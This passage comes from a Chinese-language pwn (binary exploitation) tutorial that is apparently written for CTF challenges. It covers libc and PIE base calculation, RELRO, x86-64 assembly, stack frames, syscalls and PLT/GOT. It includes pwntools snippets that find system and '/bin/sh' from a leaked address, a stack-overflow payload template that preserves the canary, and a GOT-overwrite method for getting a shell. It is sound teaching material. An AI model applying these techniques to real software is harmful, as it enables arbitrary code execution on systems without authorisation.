  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.3333}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
PIE（執行檔本體）
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
libc（\texttt{libc.\allowbreak{}so.\allowbreak{}6}）
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
offset 從哪來 & \texttt{objdump} / \texttt{readelf}
看到的位址（就是檔案內的位址） &
\texttt{libc.\allowbreak{}symbols{[}\textquotesingle{}\allowbreak{}system\textquotesingle{}\allowbreak{}{]}}、\texttt{libc.\allowbreak{}search(b\textquotesingle{}\allowbreak{}/\allowbreak{}bin/\allowbreak{}sh\textquotesingle{}\allowbreak{})}（libc
檔內的位址） \\
base 從哪來 & 洩漏到「指回程式碼段」的回傳位址、\texttt{.\allowbreak{}got} 的內容 &
洩漏到 libc 函式的 GOT
值、\texttt{\_\allowbreak{}\_\allowbreak{}libc\_\allowbreak{}start\_\allowbreak{}main+…}、\texttt{environ} \\
換算 &
\texttt{pie\_\allowbreak{}base\ \allowbreak{}=\ \allowbreak{}洩漏值\ \allowbreak{}-\allowbreak{}\ \allowbreak{}\textless{}\allowbreak{}那個位置的\ \allowbreak{}offset\textgreater{}\allowbreak{}}
&
\texttt{libc\_\allowbreak{}base\ \allowbreak{}=\ \allowbreak{}洩漏值\ \allowbreak{}-\allowbreak{}\ \allowbreak{}\textless{}\allowbreak{}那個符號的\ \allowbreak{}offset\textgreater{}\allowbreak{}} \\
之後怎麼用 & \texttt{gadget\ \allowbreak{}=\ \allowbreak{}pie\_\allowbreak{}base\ \allowbreak{}+\ \allowbreak{}0x12aa} &
\texttt{system\ \allowbreak{}=\ \allowbreak{}libc\_\allowbreak{}base\ \allowbreak{}+\ \allowbreak{}0x58740} \\
\end{longtable}
}

\textbf{先看 offset}（以本系列附的 \texttt{pwn2/\allowbreak{}libc.\allowbreak{}so.\allowbreak{}6} = Ubuntu
24.04 glibc \textbf{2.39} 為例，實測輸出）：

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{readelf} \AttributeTok{{-}s}\NormalTok{ ./libc.so.6 }\KeywordTok{|} \FunctionTok{grep} \StringTok{\textquotesingle{} system@@\textquotesingle{}}
\CommentTok{\#   1050: 0000000000058740    45 FUNC    WEAK   DEFAULT   17 system@@GLIBC\_2.2.5}
\ExtensionTok{readelf} \AttributeTok{{-}s}\NormalTok{ ./libc.so.6 }\KeywordTok{|} \FunctionTok{grep} \StringTok{\textquotesingle{} printf@@\textquotesingle{}}
\CommentTok{\#   2611: 00000000000600f0   204 FUNC    GLOBAL DEFAULT   17 printf@@GLIBC\_2.2.5}
\end{Highlighting}
\end{Shaded}

\begin{itemize}
\tightlist
\item
  \texttt{@@} 後面是「版本」（\texttt{GLIBC\_\allowbreak{}2.\allowbreak{}2.\allowbreak{}5}），\texttt{@@}
  的意思是「這是預設版本」。
\item
  \texttt{0x58740} / \texttt{0x600f0} 就是\textbf{在 libc 檔內的
  offset}，每次執行都不變。
\end{itemize}

\textbf{然後把 leak 減掉 offset}：

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ pwn }\ImportTok{import} \OperatorTok{*}

\NormalTok{libc }\OperatorTok{=}\NormalTok{ ELF(}\StringTok{\textquotesingle{}./libc.so.6\textquotesingle{}}\NormalTok{, checksec}\OperatorTok{=}\VariableTok{False}\NormalTok{)}

\CommentTok{\# 假設你洩漏到 printf 的真實位址（例如用 Format String 讀 printf@got）}
\NormalTok{leaked\_printf }\OperatorTok{=} \BaseNTok{0x7f12345600f0}

\NormalTok{libc.address }\OperatorTok{=}\NormalTok{ leaked\_printf }\OperatorTok{{-}}\NormalTok{ libc.symbols[}\StringTok{\textquotesingle{}printf\textquotesingle{}}\NormalTok{]   }\CommentTok{\# ← 這一行就是「算 libc base」}
\BuiltInTok{print}\NormalTok{(}\BuiltInTok{hex}\NormalTok{(libc.address))        }\CommentTok{\# 0x7f1234500000}
\ControlFlowTok{assert}\NormalTok{ libc.address }\OperatorTok{\&} \BaseNTok{0xfff} \OperatorTok{==} \DecValTok{0}    \CommentTok{\# base 一定是 0x1000 對齊（算錯最便宜的檢查）}

\NormalTok{system }\OperatorTok{=}\NormalTok{ libc.symbols[}\StringTok{\textquotesingle{}system\textquotesingle{}}\NormalTok{]     }\CommentTok{\# pwntools 會自動加上 libc.address → 0x7f1234558740}
\NormalTok{binsh  }\OperatorTok{=} \BuiltInTok{next}\NormalTok{(libc.search(}\StringTok{b\textquotesingle{}/bin/sh\textquotesingle{}}\NormalTok{))   }\CommentTok{\# → 0x7f12346cb42f}
\end{Highlighting}
\end{Shaded}

手算一次看得更清楚：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
libc_base = leaked_printf - 0x600f0 = 0x7f12345600f0 - 0x600f0 = 0x7f1234500000  ✓ 0x1000 對齊
system    = libc_base + 0x58740     = 0x7f1234558740
"/bin/sh" = libc_base + 0x1cb42f    = 0x7f12346cb42f
\end{Verbatim}

\begin{quote}
※注意 \textbf{四個常見錯誤} 1. 把 PIE 的 offset 拿去加 libc
base（或反過來）→ 跳到莫名其妙的位址，通常是 SIGSEGV。 2. \textbf{libc
版本必須和遠端一致}------同一個 \texttt{system} 在不同 glibc 的 offset
完全不同（實測見下表）。 3. \textbf{PIE base 與 libc base 都一定是
\texttt{0x1000} 對齊}，算完 \texttt{assert} 一下最省事。 4. 把
\textbf{IFUNC} 的符號（\texttt{strlen} / \texttt{strcspn} /
\texttt{memcpy}\ldots，見第 1 節名詞表）拿去算 base： \textbf{GOT 裡的值
≠ \texttt{readelf\ \allowbreak{}-\allowbreak{}s} 的符號值}，會得到錯誤的 base。
\end{quote}

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 6\tabcolsep) * \real{0.2500}}
  >{\raggedright\arraybackslash}p{(\linewidth - 6\tabcolsep) * \real{0.2500}}
  >{\raggedright\arraybackslash}p{(\linewidth - 6\tabcolsep) * \real{0.2500}}
  >{\raggedright\arraybackslash}p{(\linewidth - 6\tabcolsep) * \real{0.2500}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
libc
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
版本
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
\texttt{system} offset
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
\texttt{printf} offset
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
\texttt{pwn2/\allowbreak{}libc.\allowbreak{}so.\allowbreak{}6}（題目附的 Ubuntu 24.04 libc） & 2.39 &
\texttt{0x58740} & \texttt{0x600f0} \\
本機 Arch \texttt{/\allowbreak{}usr/\allowbreak{}lib/\allowbreak{}libc.\allowbreak{}so.\allowbreak{}6} & 2.44 & \texttt{0x54580} &
\texttt{0x5b6f0} \\
\end{longtable}
}

所以\textbf{有附 libc
就用附的}（\texttt{ELF(\textquotesingle{}\allowbreak{}./\allowbreak{}libc.\allowbreak{}so.\allowbreak{}6\textquotesingle{}\allowbreak{})}，不要用
\texttt{/\allowbreak{}usr/\allowbreak{}lib/\allowbreak{}libc.\allowbreak{}so.\allowbreak{}6}）， 並用
\texttt{./\allowbreak{}ld-\allowbreak{}linux-\allowbreak{}x86-\allowbreak{}64.\allowbreak{}so.\allowbreak{}2\ \allowbreak{}-\allowbreak{}\/\allowbreak{}-\allowbreak{}library-\allowbreak{}path\ \allowbreak{}.\allowbreak{}\ \allowbreak{}./\allowbreak{}chal}
在本機重現遠端環境（見第 15 節）。

\begin{quote}
※提示 pwn5 是\textbf{完全不需要 libc} 的一題（它用程式 PLT 裡就有的
\texttt{system@plt}）， 所以本系列裡它最不怕「遠端 libc
版本不同」這件事。
\end{quote}

\paragraph{4.4 RELRO（GOT 保護）}\label{relrogot-ux4fddux8b77}

（\texttt{.\allowbreak{}got} / \texttt{.\allowbreak{}got.\allowbreak{}plt} 到底是什麼，見第 8
節；這裡先看結論。）

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 2\tabcolsep) * \real{0.5000}}
  >{\raggedright\arraybackslash}p{(\linewidth - 2\tabcolsep) * \real{0.5000}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
值
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
意義
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
\textbf{No RELRO} & GOT 完全可寫 \\
\textbf{Partial RELRO} & \texttt{.\allowbreak{}got} 唯讀，但 \texttt{.\allowbreak{}got.\allowbreak{}plt} 可寫 →
\textbf{可以改 \texttt{xxx@got} 劫持函式} \\
\textbf{Full RELRO} & 載入時就把所有函式位址填好，GOT 變唯讀 →
\textbf{不能改 GOT} \\
\end{longtable}
}

\paragraph{4.5
其他（現代編譯器加上去的）}\label{ux5176ux4ed6ux73feux4ee3ux7de8ux8b6fux5668ux52a0ux4e0aux53bbux7684}

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 2\tabcolsep) * \real{0.5000}}
  >{\raggedright\arraybackslash}p{(\linewidth - 2\tabcolsep) * \real{0.5000}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
名稱
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
說明
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
\textbf{SHSTK (CET)} & Shadow Stack，\texttt{ret}
會比對另一個「影子堆疊」→ 純 ROP 會被抓（但通常遠端核心不一定啟用） \\
\textbf{IBT (CET)} & Indirect Branch Tracking，間接跳躍目標必須以
\texttt{endbr64} 開頭 \\
\textbf{FORTIFY\_SOURCE} & \texttt{\_\allowbreak{}\_\allowbreak{}memcpy\_\allowbreak{}chk} /
\texttt{\_\allowbreak{}\_\allowbreak{}printf\_\allowbreak{}chk} 等「檢查版」函式，超過預期大小會 abort \\
\end{longtable}
}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{5. x86-64
組合語言速成}\label{x86-64-ux7d44ux5408ux8a9eux8a00ux901fux6210}

\paragraph{5.1 暫存器}\label{ux66abux5b58ux5668}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
rax  rbx  rcx  rdx  rsi  rdi  rbp  rsp  r8  r9  r10  r11  r12  r13  r14  r15
\end{Verbatim}

每個 64 bits（8 bytes）。子暫存器：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
rax (64)  →  eax (32)  →  ax (16)  →  al (8) / ah (8)
r8  (64)  →  r8d (32)  →  r8w (16) →  r8b (8)
\end{Verbatim}

\textbf{重要}：寫 \texttt{eax} 會把 \texttt{rax} 的高 32 bits 清成 0；
寫 \texttt{ax} 或 \texttt{al}
則\textbf{只動低位}。這個差別在控制長度時很關鍵。

\paragraph{5.2 指令}\label{ux6307ux4ee4}

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 2\tabcolsep) * \real{0.5000}}
  >{\raggedright\arraybackslash}p{(\linewidth - 2\tabcolsep) * \real{0.5000}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
指令
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
意思
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
\texttt{mov\ \allowbreak{}dst,\allowbreak{}\ \allowbreak{}src} & \texttt{dst\ \allowbreak{}=\ \allowbreak{}src}（複製） \\
\texttt{lea\ \allowbreak{}dst,\allowbreak{}\ \allowbreak{}{[}位址算式{]}} &
\texttt{dst\ \allowbreak{}=\ \allowbreak{}算出來的位址}（\textbf{不會存取記憶體}） \\
\texttt{add/\allowbreak{}sub\ \allowbreak{}dst,\allowbreak{}\ \allowbreak{}src} & 加減 \\
\texttt{imul\ \allowbreak{}dst,\allowbreak{}\ \allowbreak{}src} & 乘法 \\
\texttt{xor\ \allowbreak{}dst,\allowbreak{}\ \allowbreak{}src} & 互斥或（\texttt{xor\ \allowbreak{}rax,\allowbreak{}rax}
是常用的「歸零」寫法） \\
\texttt{shl/\allowbreak{}shr\ \allowbreak{}dst,\allowbreak{}\ \allowbreak{}n} & 左移 / 右移 \\
\texttt{and/\allowbreak{}or\ \allowbreak{}dst,\allowbreak{}\ \allowbreak{}src} & 位元運算 \\
\texttt{cmp\ \allowbreak{}a,\allowbreak{}\ \allowbreak{}b} & 計算 \texttt{a\ \allowbreak{}-\allowbreak{}\ \allowbreak{}b}
並設定旗標（\textbf{不存結果}） \\
\texttt{test\ \allowbreak{}a,\allowbreak{}\ \allowbreak{}b} & 計算 \texttt{a\ \allowbreak{}\&\allowbreak{}\ \allowbreak{}b} 並設定旗標 \\
\texttt{jmp\ \allowbreak{}addr} & 無條件跳躍 \\
\texttt{je/\allowbreak{}jz} & 等於（ZF=1）時跳 \\
\texttt{jne/\allowbreak{}jnz} & 不等於時跳 \\
\texttt{jg} / \texttt{jge} & \textbf{有號}大於 / 大於等於 \\
\texttt{ja} / \texttt{jae} & \textbf{無號}大於 / 大於等於 \\
\texttt{jb} / \texttt{jbe} & 無號小於 / 小於等於 \\
\texttt{call\ \allowbreak{}addr} & \texttt{push\ \allowbreak{}下一行位址} 然後
\texttt{jmp\ \allowbreak{}addr} \\
\texttt{ret} & \texttt{pop\ \allowbreak{}rip} \\
\texttt{leave} & \texttt{mov\ \allowbreak{}rsp,\allowbreak{}\ \allowbreak{}rbp} 然後
\texttt{pop\ \allowbreak{}rbp}（函式收尾） \\
\texttt{push\ \allowbreak{}x} / \texttt{pop\ \allowbreak{}x} &
\texttt{rsp\ \allowbreak{}-=\ \allowbreak{}8;\ \allowbreak{}{[}rsp{]}\ \allowbreak{}=\ \allowbreak{}x} /
\texttt{x\ \allowbreak{}=\ \allowbreak{}{[}rsp{]};\ \allowbreak{}rsp\ \allowbreak{}+=\ \allowbreak{}8} \\
\texttt{movzx\ \allowbreak{}dst,\allowbreak{}\ \allowbreak{}src} & 把 src \textbf{零擴展}後放進
dst（\texttt{movzx\ \allowbreak{}edx,\allowbreak{}\ \allowbreak{}bl} 就是「取 bl 並清高位」） \\
\texttt{movsx/\allowbreak{}movsxd} &
\textbf{符號擴展}（\texttt{movsxd\ \allowbreak{}rax,\allowbreak{}\ \allowbreak{}{[}mem{]}} 讀 32-bit
但當有號數擴成 64-bit） \\
\texttt{syscall} & 呼叫 Linux 核心（見第 7 節） \\
\texttt{nop} & 什麼都不做 \\
\end{longtable}
}

\begin{quote}
※重要 \textbf{\texttt{jg} vs \texttt{ja} 是重要考點}：pwn7
的漏洞就是編譯器用了 \texttt{jg}（有號），
讓負的索引穿過「\textgreater{} 15」的檢查。

※提示 \texttt{je} / \texttt{jne} 看的 \texttt{ZF} 是「上一次
\texttt{cmp} / \texttt{test} 的結果是否為 0」這個旗標： \texttt{ZF=1}
代表相等。所以 \texttt{test\ \allowbreak{}al,\allowbreak{}al} 之後接
\texttt{je}，意思就是「\texttt{al\ \allowbreak{}==\ \allowbreak{}0} 就跳」。
\end{quote}

\paragraph{5.3 定址模式}\label{ux5b9aux5740ux6a21ux5f0f}

\begin{Shaded}
\begin{Highlighting}[]
\BuiltInTok{mov}  \KeywordTok{rax}\OperatorTok{,} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x8}\OperatorTok{]}        \CommentTok{; 讀 rbp{-}8 這個位址的 8 bytes}
\BuiltInTok{mov}  \KeywordTok{eax}\OperatorTok{,} \DataTypeTok{DWORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rdi}\OperatorTok{]}  \CommentTok{; 讀 4 bytes}
\BuiltInTok{movzx} \KeywordTok{eax}\OperatorTok{,} \DataTypeTok{BYTE} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rdi}\OperatorTok{]}  \CommentTok{; 讀 1 byte 並零擴展}
\BuiltInTok{lea}  \KeywordTok{rsi}\OperatorTok{,} \OperatorTok{[}\KeywordTok{rsp}\OperatorTok{{-}}\BaseNTok{0x40}\OperatorTok{]}       \CommentTok{; rsi = rsp {-} 0x40（不算記憶體）}
\BuiltInTok{mov}  \KeywordTok{rax}\OperatorTok{,} \OperatorTok{[}\KeywordTok{rbx}\OperatorTok{+}\KeywordTok{rax}\OperatorTok{*}\DecValTok{8}\OperatorTok{]}      \CommentTok{; 陣列索引：rbx + rax*8}
\end{Highlighting}
\end{Shaded}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{6.
函式呼叫與堆疊框架}\label{ux51fdux5f0fux547cux53ebux8207ux5806ux758aux6846ux67b6}

\paragraph{6.1 呼叫約定（System V AMD64 ABI，Linux
用這個）}\label{ux547cux53ebux7d04ux5b9asystem-v-amd64-abilinux-ux7528ux9019ux500b}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
整數/指標參數：rdi, rsi, rdx, rcx, r8, r9
第 7 個以後：  放堆疊
回傳值：       rax（64-bit 整數）
\end{Verbatim}

\paragraph{6.2 標準函式序曲 /
收尾}\label{ux6a19ux6e96ux51fdux5f0fux5e8fux66f2-ux6536ux5c3e}

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{; 進入函式}
\BuiltInTok{push} \KeywordTok{rbp}              \CommentTok{; 保存呼叫者的 rbp}
\BuiltInTok{mov}  \KeywordTok{rbp}\OperatorTok{,} \KeywordTok{rsp}         \CommentTok{; rbp 指向本函式的框架底部}
\BuiltInTok{sub}  \KeywordTok{rsp}\OperatorTok{,} \BaseNTok{0x40}        \CommentTok{; 配置區域變數空間}

\CommentTok{; ... 函式本體 ...}

\CommentTok{; 離開函式}
\BuiltInTok{leave}                 \CommentTok{; = mov rsp,rbp ; pop rbp}
\ControlFlowTok{ret}                   \CommentTok{; = pop rip}
\end{Highlighting}
\end{Shaded}

\paragraph{6.3 堆疊框架圖}\label{ux5806ux758aux6846ux67b6ux5716}

以一個含有 \texttt{char\ \allowbreak{}buf{[}0x30{]}} 的函式 \texttt{f()} 為例（呼叫者
\texttt{call} 進去之後）：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
位址高
        ┌──────────────────────────┐
        │  呼叫者的區域變數        │
        ├──────────────────────────┤
        │  參數 7、8 ...（若有）   │
        ├──────────────────────────┤  ← call 之前
        │  返回位址  ← call 壓的   │  ← rbp+8  (call 之後、push rbp 之前 rsp 在這)
        ├──────────────────────────┤
        │  saved rbp  ← push rbp   │  ← rbp+0  ← rbp 指向這
        ├──────────────────────────┤
        │  canary                  │  ← rbp-0x8   ← 最靠近 rbp，所以最先被撞到
        ├──────────────────────────┤
        │  （8 bytes 對齊 padding）│  ← rbp-0x10
        ├──────────────────────────┤
        │  char buf[0x30]          │  ← rbp-0x40   ← 緩衝區起點（位址最低）
        └──────────────────────────┘  ← rsp = rbp-0x40
位址低
\end{Verbatim}

\begin{quote}
※注意 由上往下讀是「位址變低」。\texttt{buf} 在最下面 →
\textbf{溢位時你依序會蓋到}： \texttt{buf} 尾端 → \textbf{canary} →
saved rbp → 返回位址。 順序是「先 canary、後返回位址」，不是反過來。
\end{quote}

\textbf{offset 怎麼算？} 一律是「從 \texttt{buf} 起點往上數」：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
canary 的 offset  = (rbp - 8) - &buf       # 以 char buf[0x30] 為例 = 0x38
返回位址的 offset = (rbp + 8) - &buf       #                     = 0x48
\end{Verbatim}

實測（\texttt{gcc\ \allowbreak{}-\allowbreak{}O0} + 預設 \texttt{-\allowbreak{}fstack-\allowbreak{}protector}，用
\texttt{objdump\ \allowbreak{}-\allowbreak{}d\ \allowbreak{}-\allowbreak{}M\ \allowbreak{}intel} 看）：

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 8\tabcolsep) * \real{0.2000}}
  >{\raggedright\arraybackslash}p{(\linewidth - 8\tabcolsep) * \real{0.2000}}
  >{\raggedright\arraybackslash}p{(\linewidth - 8\tabcolsep) * \real{0.2000}}
  >{\raggedright\arraybackslash}p{(\linewidth - 8\tabcolsep) * \real{0.2000}}
  >{\raggedright\arraybackslash}p{(\linewidth - 8\tabcolsep) * \real{0.2000}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
宣告
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
\texttt{sub\ \allowbreak{}rsp,\allowbreak{}N}
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
\texttt{buf} 實際落在
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
canary 的 offset
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
返回位址的 offset
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
\texttt{char\ \allowbreak{}buf{[}0x10{]}} & \texttt{0x20} & \texttt{rbp-\allowbreak{}0x20} &
\texttt{0x18} & \texttt{0x28} \\
\texttt{char\ \allowbreak{}buf{[}0x20{]}} & \texttt{0x30} & \texttt{rbp-\allowbreak{}0x30} &
\texttt{0x28} & \texttt{0x38} \\
\texttt{char\ \allowbreak{}buf{[}0x30{]}} & \texttt{0x40} & \texttt{rbp-\allowbreak{}0x40} &
\texttt{0x38} & \texttt{0x48} \\
\texttt{char\ \allowbreak{}buf{[}0x40{]}} & \texttt{0x50} & \texttt{rbp-\allowbreak{}0x50} &
\texttt{0x48} & \texttt{0x58} \\
\end{longtable}
}

\begin{quote}
※重要 \textbf{不要用「陣列大小 + 8」猜 canary 的 offset。} GCC
會把整個框架對齊到 16 bytes，所以 \texttt{char\ \allowbreak{}buf{[}0x30{]}}
實際被放在 \textbf{\texttt{rbp-\allowbreak{}0x40}} （不是
\texttt{rbp-\allowbreak{}0x30}），中間還夾了 8 bytes 的 padding。
\textbf{正確做法是看反組譯裡的 \texttt{lea\ \allowbreak{}rax,{[}rbp-\allowbreak{}0x??{]}}}（那就是
\texttt{buf} 的起點）， 或用 gdb 印 \texttt{p/\allowbreak{}x\ \allowbreak{}\$\allowbreak{}rbp} 與
\texttt{p/\allowbreak{}x\ \allowbreak{}\&\allowbreak{}buf} 相減（見 6.4）。
\end{quote}

有 canary 的題目，payload 一定要長成這個樣子：

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{payload  }\OperatorTok{=} \StringTok{b"A"} \OperatorTok{*}\NormalTok{ canary\_offset      }\CommentTok{\# 填滿 buf（連 padding 一起填）}
\NormalTok{payload }\OperatorTok{+=}\NormalTok{ p64(canary)               }\CommentTok{\# ✶ 原封不動寫回「洩漏到的」canary}
\NormalTok{payload }\OperatorTok{+=} \StringTok{b"B"} \OperatorTok{*} \DecValTok{8}                  \CommentTok{\# saved rbp（填垃圾即可）}
\NormalTok{payload }\OperatorTok{+=}\NormalTok{ p64(return\_address)       }\CommentTok{\# 蓋掉返回位址}
\end{Highlighting}
\end{Shaded}

canary 的\textbf{最低位 byte 一定是 \texttt{0x00}}（它來自
\texttt{fs:\allowbreak{}0x28}，最低位 byte 固定為 0）， 所以常常能靠「印出字串印到
\texttt{0x00} 為止」洩漏出剩下的 7 bytes； 但\textbf{不要只補那一個
\texttt{0x00}}------要整條 8 bytes 用洩漏到的原值寫回去。

\begin{quote}
※提示 \textbf{兩種寫法其實是同一件事}：本系列後面的 pwn1 / pwn7 會直接寫
「\texttt{buf\ \allowbreak{}+\ \allowbreak{}0x80}」、「\texttt{buf\ \allowbreak{}+\ \allowbreak{}0x48}」這種「從緩衝區起點往後數」的講法，
它跟這裡的 \texttt{offset\ \allowbreak{}=\ \allowbreak{}(rbp\ \allowbreak{}+\ \allowbreak{}8)\ \allowbreak{}-\allowbreak{}\ \allowbreak{}\&\allowbreak{}buf} 完全等價 ------
只是把「距離」改寫成「從 \texttt{buf} 起跳的位移」。
唯一要注意的是：\texttt{rbp} 不一定存在（編譯器可以不建框架指標），
但「\texttt{buf} 到返回位址的距離」永遠是固定的。
\end{quote}

\paragraph{6.4 怎麼找 offset？}\label{ux600eux9ebcux627e-offset}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\item
  \textbf{看反組譯}：找 \texttt{sub\ \allowbreak{}rsp,\allowbreak{}\ \allowbreak{}N} 和
  \texttt{lea\ \allowbreak{}rXX,\allowbreak{}\ \allowbreak{}{[}rbp-\allowbreak{}0x??{]}}，算距離。
\item
  \textbf{用 gdb}：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
b *0x401234        # 在 read 之前下中斷點
run
p/x $rbp
p/x &buf           # 或 lea 算出來的位址
\end{Verbatim}
\item
  \textbf{用 cyclic pattern（pwntools）}：

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ pwn }\ImportTok{import} \OperatorTok{*}
\NormalTok{p }\OperatorTok{=}\NormalTok{ process(}\StringTok{\textquotesingle{}./chal\textquotesingle{}}\NormalTok{)}
\NormalTok{p.sendline(cyclic(}\DecValTok{200}\NormalTok{))}
\CommentTok{\# 程式崩潰，看 rip 變成什麼}
\CommentTok{\# 例如 rip = 0x6161616b6161616a}
\BuiltInTok{print}\NormalTok{(cyclic\_find(}\BaseNTok{0x6161616b6161616a}\NormalTok{))   }\CommentTok{\# → offset}
\end{Highlighting}
\end{Shaded}
\end{enumerate}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{7.
系統呼叫（syscall）}\label{ux7cfbux7d71ux547cux53ebsyscall}

程式要讀檔、開檔、執行程式，都要跟核心要服務。x86-64 的約定：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
rax = 系統呼叫編號
rdi, rsi, rdx, r10, r8, r9 = 參數 1~6     ← 注意第 4 個是 r10，不是 rcx！
syscall
→ 回傳值在 rax（負值表示 -errno）
\end{Verbatim}

常用編號：

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}lll@{}}
\toprule\noalign{}
編號 & 名稱 & 參數 \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
0 & \texttt{read} & \texttt{(fd,\allowbreak{}\ \allowbreak{}buf,\allowbreak{}\ \allowbreak{}count)} \\
1 & \texttt{write} & \texttt{(fd,\allowbreak{}\ \allowbreak{}buf,\allowbreak{}\ \allowbreak{}count)} \\
2 & \texttt{open} & \texttt{(path,\allowbreak{}\ \allowbreak{}flags,\allowbreak{}\ \allowbreak{}mode)} \\
3 & \texttt{close} & \texttt{(fd)} \\
9 & \texttt{mmap} & \ldots{} \\
15 & \texttt{rt\_\allowbreak{}sigreturn} & \textbf{SROP 關鍵} \\
59 & \texttt{execve} & \texttt{(path,\allowbreak{}\ \allowbreak{}argv,\allowbreak{}\ \allowbreak{}envp)} \\
60 & \texttt{exit} & \texttt{(code)} \\
231 & \texttt{exit\_\allowbreak{}group} & \texttt{(code)} \\
\end{longtable}
}

\paragraph{為什麼「系統呼叫」對 pwn
很重要}\label{ux70baux4ec0ux9ebcux7cfbux7d71ux547cux53ebux5c0d-pwn-ux5f88ux91cdux8981}

\textbf{只要你能控制 \texttt{rax} 和參數暫存器，就能做任何事} ------
不需要 libc。 在沒有 libc（靜態連結、或 libc 被 seccomp 限制）的情況下，
直接下 syscall 是唯一的路。

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{8. PLT 與 GOT}\label{plt-ux8207-got}

動態連結的程式呼叫 \texttt{printf()} 時，它其實不知道 \texttt{printf}
在哪。 流程是這樣：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
你的程式碼
   call printf@plt          ← 編譯器產生
        │
        ▼
   .plt 裡的 printf@plt:
        jmp QWORD PTR [printf@got]     ← 讀 GOT 裡的位址跳過去
        push <index>
        jmp PLT0                        ← 第一次：去 _dl_runtime_resolve 找位址
                                        ; 找到後把位址寫進 printf@got
\end{Verbatim}

\begin{itemize}
\tightlist
\item
  \textbf{\texttt{.\allowbreak{}plt}}：跳板（stub），位址固定。
\item
  \textbf{\texttt{.\allowbreak{}got.\allowbreak{}plt}}：存放「解析後的真實位址」。
\end{itemize}

\paragraph{為什麼 pwn 喜歡打
GOT}\label{ux70baux4ec0ux9ebc-pwn-ux559cux6b61ux6253-got}

\begin{itemize}
\tightlist
\item
  \textbf{Partial RELRO} 時 \texttt{.\allowbreak{}got.\allowbreak{}plt} 可寫。 把
  \texttt{printf@got} 改成 \texttt{system} 的位址 → 之後每次呼叫
  \texttt{printf(x)} 就變成 \texttt{system(x)}。
\item
  如果 \texttt{x} 是我們控制的字串，就可以 \texttt{system("/\allowbreak{}bin/\allowbreak{}sh")}。
\end{itemize}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{9.
常見漏洞類型}\label{ux5e38ux898bux6f0fux6d1eux985eux578b}

